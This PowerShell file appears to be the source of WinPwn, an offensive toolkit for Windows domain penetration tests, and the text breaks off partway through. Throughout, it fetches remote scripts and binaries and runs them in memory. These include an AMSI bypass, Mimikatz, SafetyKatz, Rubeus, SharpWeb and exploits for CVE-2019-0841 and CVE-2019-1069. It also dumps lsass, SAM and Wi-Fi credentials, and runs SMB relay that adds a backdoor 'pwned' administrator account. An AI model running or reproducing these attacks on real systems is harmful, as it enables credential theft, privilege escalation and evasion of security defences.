#Zipping Function
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}
function AmsiBypass
{
    <#
        .DESCRIPTION
        Amsi bypass by https://github.com/rasta-mouse/AmsiScanBufferBypass
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
}

function dependencychecks
{
    <#
        .DESCRIPTION
        Checks for System Role, Powershell Version, Proxy active/not active, Elevated or non elevated Session.
        Creates the Log directories or checks if they are already available.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
         [int]$systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole



         $systemRoles = @{
                              0         =    " Standalone Workstation    " ;
                              1         =    " Member Workstation        " ;
                              2         =    " Standalone Server         " ;
                              3         =    " Member Server             " ;
                              4         =    " Backup  Domain Controller " ;
                              5         =    " Primary Domain Controller "       
         }

        #Proxy Detect #1
        proxydetect
        pathcheck
        $PSVersion=$PSVersionTable.PSVersion.Major
        
        write-host "[?] Checking for Default PowerShell version ..`n" -ForegroundColor black -BackgroundColor white  ; sleep 1
        
        if($PSVersion -lt 2){
           
                Write-Warning  "[!] You have PowerShell v1.0.`n"
            
                Write-Warning  "[!] This script only supports Powershell verion 2 or above.`n"
                       
                exit  
        }
        
        write-host "       [+] ----->  PowerShell v$PSVersion`n" ; sleep 1
        
        write-host "[?] Detecting system role ..`n" -ForegroundColor black -BackgroundColor white ; sleep 1
        
        $systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
        
        if($systemRoleID -ne 1){
        
                "       [-] Some features in this script need access to the domain. They can only be run on a domain member machine. Pwn some domain machine for them!`n"
               
                Read-Host "Type any key to continue .."
                   
        }
        
        write-host "       [+] ----->",$systemRoles[[int]$systemRoleID],"`n" ; sleep 1
}

function pathCheck
{
<#
        .DESCRIPTION
        Checks for correct path dependencies.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Dependency Check
        $currentPath = (Get-Item -Path ".\" -Verbose).FullName                
        Write-Host -ForegroundColor Yellow 'Creating/Checking Log Folders in '$currentPath' directory:'
        
        if(!(Test-Path -Path $currentPath\LocalRecon\)){mkdir $currentPath\LocalRecon\}
        if(!(Test-Path -Path $currentPath\DomainRecon\)){mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
        if(!(Test-Path -Path $currentPath\LocalPrivEsc\)){mkdir $currentPath\LocalPrivEsc\}
        if(!(Test-Path -Path $currentPath\Exploitation\)){mkdir $currentPath\Exploitation\}
        if(!(Test-Path -Path $currentPath\Vulnerabilities\)){mkdir $currentPath\Vulnerabilities\}
        if(!(Test-Path -Path $currentPath\LocalPrivEsc\)){mkdir $currentPath\LocalPrivEsc\}

}

function sharpcradle{
<#
    .DESCRIPTION
        Download .NET Binary to RAM.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
        Param
    (
        [bool]
        $allthosedotnet,
	    [bool]
        $polar,
        [string]
        $url,
        [string]
        $argument1,
        [string]
        $argument2,
        [string]
        $argument3
    )
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if ($allthosedotnet)
    {
        @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> Automate some internal Penetrationtest processes
'@
        
        do
        {
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. Seatbelt '
            Write-Host -ForegroundColor Green '2. Kerberoasting Using Rubeus! '
            Write-Host -ForegroundColor Green '3. Search for missing windows patches Using Watson! '
            Write-Host -ForegroundColor Green '4. Get all those Browser Credentials with Sharpweb! '
            Write-Host -ForegroundColor Green '5. Check common Privesc vectors using Sharpup! '
            Write-Host -ForegroundColor Green '6. Load Safetykatz to RAM and gather credentials! '
            Write-Host -ForegroundColor Green '7. Exploit Missing Windows Updates (CVE-2019-0841, CVE-2019-1069, CVE-2019-1129, CVE-2019-1130)! '
            Write-Host -ForegroundColor Green '8. Exit. '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')

            Switch ($masterquestion) 
            {
                 1{Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe -argument1 all >> $currentPath\LocalRecon\SeatBeltOutput.txt}
                2{Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 asreproast -argument2 "/format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 kerberoast -argument2 "/format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt}
                3{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt;  }
                4{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
                5{Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'; if (isadmin){Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe -argument1 audit >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt;} }
                6{if (isadmin){Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt}}
                7{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-0841 : VULNERABLE"){if(!(Test-Path -Path C:\temp\)){mkdir C:\temp};[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/privesc.exe -argument1 license.rtf; Start-Sleep -Seconds 3; cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}}If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1069 : VULNERABLE"){sharpcradle -polar $true;return;}; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1129 : VULNERABLE"){sharpcradle -polar $true;return;};}
            }
        }
        While ($masterquestion -ne 8)
    	      
	    
    }
    if ($polar)
    {
    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
    	$polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
	    {
		    $username = Read-Host -Prompt 'Please enter the username'
		    $password = Read-Host -Prompt 'Please enter the password'
		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
		
		    if ([Environment]::Is64BitProcess)
		    {
			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
			    Start-Sleep -Seconds 1.5
			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
		    }
		    else
		    {
			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
			    Start-Sleep -Seconds 1.5
			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
		    }
		
		    move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
		    del .\schedsvc.dll
		    del .\schtasks.exe
		    del C:\windows\system32\tasks\test
	    }
        else
        {
            $system = Read-Host -Prompt 'You can also try to elevate privileges using the last sandboxescaper vuln (ByeBear). Lets do it? (y/n)'
	        if ($system -eq "no" -or $system -eq "n" -or $system -eq "No" -or $system -eq "N")
	            {
	                Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
		            Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
		            Start-Sleep -Seconds 15
		            Write-Host 'Next Try..'
		            Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
		            Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
		            Start-Sleep -Seconds 15
                }
        }
    }
    else
    {    
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     	if ($url)
        {
            if ($argument1)
            {
                if ($argument2)
                {
                    if($argument3)
                    {
                        Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2 -argument3 $argument3
                    }
                    else{Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2}
                }
                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
            }
            else
            {
                $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
	            if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
                {
                    $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file:'
                    $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable?'
	                if ($arg1 -eq "yes" -or $arg1 -eq "y" -or $arg1 -eq "Yes" -or $arg1 -eq "Y")
                    {
                        $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file:'
                        Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
                    }
                    else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
                }
                else
                {
                    Invoke-Sharpcradle -Uri $url
                }
            }
         
        }
        else
        {
            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe'
    	    $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
	        if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
            {
                $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file:'
                $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable?'
	            if ($arg1 -eq "yes" -or $arg1 -eq "y" -or $arg1 -eq "Yes" -or $arg1 -eq "Y")
                {
                    $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file:'
                    Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
                }
                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
             
            }
            else
            {
                Invoke-Sharpcradle -Uri $url
            }
        }
            	
    }
}

function isadmin
{
    # Check if Elevated
    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $isAdmin
}

function Inveigh {
<#
    .DESCRIPTION
        Starts Inveigh in a parallel window.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    pathcheck
    $currentip = Get-currentIP
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks? (yes/no)'
    
    if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
    {
        Write-Host 'Starting WinPwn in a new window so that you can use this one for Invoke-TheHash'
        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1'');WinPwn;}'
        $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
        $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
        $Wcl = new-object System.Net.WebClient
        $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Inveigh-Relay.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-SMBClient.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-SMBEnum.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-SMBExec.ps1")

        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session

        Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
    }
    
    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack? (yes/no)'
    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
    {   
        if (isadmin)
        {
                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
		}
        else 
        {
               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
	    }
    }
    else
    {
        if (isadmin)
        {
                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
		
        }
        else 
        {
               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath\;}
	       
        }
    }
}


function adidnswildcard
{
    <#
    .DESCRIPTION
        Starts Inveigh in a parallel window.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    pathcheck
    $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
    {
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Powermad.ps1")
        New-ADIDNSNode -Node * -Tombstone -Verbose
        Write-Host -ForegroundColor Red 'Be sure to remove the record with `Disable-ADIDNSNode -Node * -Verbose` at the end of your tests'
        Write-Host -ForegroundColor Yellow 'Starting Inveigh to capture all theese mass hashes:'
        Inveigh
    }
           
}

function sessionGopher 
{
    <#
    .DESCRIPTION
        Starts SessionGopher to search for Cached Credentials.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/segoph.ps1')
    $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
    if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
    {
            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet -hdPXEKUQjxCYg9C -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt
            }
    }
    else
    {
        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet -hdPXEKUQjxCYg9C >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                cachet >> $currentPath\LocalRecon\SessionGopher.txt
            }
    }
}


function kittielocal 
{
    <#
    .DESCRIPTION
        Dumps Credentials from Memory / Registry / SAM Database.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    AmsiBypass
      
        do
        {
	     @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> Get some credentials
'@
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie (Admin session only, heuristic detection likely)! '
            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
            Write-Host -ForegroundColor Green '5. Download and run lazagne (AV detection likely)! '
            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
	    Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only'
	    Write-Host -ForegroundColor Green '10. Exit. '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')

            Switch ($masterquestion) 
            {
                1{iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
                2{if (isadmin){obfuskittiedump}}
                3{if(isadmin){safedump}}
                4{is(isadmin){dumplsass}}
                5{lazagnemodule}
                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
		7{obfusminikittie}
		8{if(isadmin){wificreds}}
		9{if(isadmin){}}
             }
        }
        While ($masterquestion -ne 10)
        
    function safedump
    {
    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
    }
    
    function obfuskittiedump
    {
    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
	Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
        Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
    }
    function wificreds
    {
    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
	Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
	Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
    }
    
    function obfusminikittie
    {
    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
	Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
	inbox >> $currentPath\Exploitation\kittenz.txt
    }
    
    function samfile
    {
    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
    	Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
	Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
    }
}

function dumplsass
{
<#
        .DESCRIPTION
        Dump lsass, credit goes to https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if (isadmin)
    {
    	try{
    	$processes = Get-Process
    	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
	Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
	Write-Host "Dumpfile goes to .\Exploitation\$env:computername.dmp "
	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\$env:computername.dmp full
	}
	catch{
		Write-Host "Something went wrong, using safetykatz instead"
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SafetyDump.ps1')
                 Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
                 Safetydump
	}
    }
    else{Write-Host "No Admin rights, start again using a privileged session!"}
}

function localreconmodules
{
<#
        .DESCRIPTION
        All local recon scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Local Reconning


           
            function powershellsensitive
            {
            Write-Host -ForegroundColor Yellow 'Parsing Event logs for sensitive Information:'
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/EventLogParser.exe' -Outfile "$currentPath\EventLogParser.exe"
            .\EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
            .\EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
            Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' >> "$currentPath\LocalRecon\Powershell_Logs.txt" 
	        if (isadmin){.\EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}
            }
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')

            function generalrecon{
            Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
            #Check for WSUS Updates over HTTP
	        Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
            $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
            $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer

            if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
	        {
        	    Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\Vulnerabilities\WsusoverHTTP.txt"
            }

            #Check for SMB Signing
            Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
            Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\Vulnerabilities\SMBSigningState.txt"

            #Collecting Informations
            Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
            systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
            Write-Host -ForegroundColor Yellow 'Getting Patches'
